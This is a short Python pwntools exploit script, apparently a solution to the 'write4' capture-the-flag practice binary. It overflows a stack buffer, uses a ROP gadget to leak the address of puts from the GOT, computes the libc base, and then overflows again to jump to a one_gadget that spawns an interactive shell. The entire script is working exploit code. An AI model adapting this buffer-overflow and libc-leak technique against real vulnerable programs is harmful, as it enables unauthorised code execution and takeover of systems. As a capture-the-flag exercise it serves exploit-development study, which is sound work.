#!/usr/bin/python 
from pwn import *

p = process("./write4")
elf = ELF("./write4")
libc = elf.libc 
p1ret = 0x400893

pay = 'A'*(0x20+0x8)
pay += p64(p1ret) + p64(elf.got['puts']) + p64(elf.plt['puts'])
pay += p64(elf.symbols['pwnme'])

p.sendlineafter("> ", pay)

puts = u64(p.recv(6) + "\x00\x00")
libcBase = puts - libc.symbols['puts']
one_gadget = libcBase + 0x4526a

p.sendlineafter("> ", 'A'*(0x20+0x8) + p64(one_gadget))

p.interactive()
